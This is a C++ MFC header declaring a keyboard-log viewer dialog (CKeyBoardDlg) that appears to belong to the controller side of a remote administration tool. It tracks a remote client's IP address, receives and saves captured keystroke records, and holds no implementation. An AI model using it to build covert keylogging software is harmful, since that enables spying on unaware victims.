#pragma once

#include "include/IOCPServer.h"
// CKeyBoardDlg 对话框

class CKeyBoardDlg : public CDialog
{
	DECLARE_DYNAMIC(CKeyBoardDlg)

public:
	CKeyBoardDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
	virtual ~CKeyBoardDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_KEYBOARD };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	CEdit m_edit;

	void OnReceiveComplete();

public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
protected:
	virtual void PostNcDestroy();
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnClose();
	afx_msg void OnSize(UINT nType, int cx, int cy);

private:
	bool SaveRecord();
	void UpdateTitle();
	void ResizeEdit();
	void AddKeyBoardData();
	HICON m_hIcon;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsOfflineRecord;
	void SendException();
};
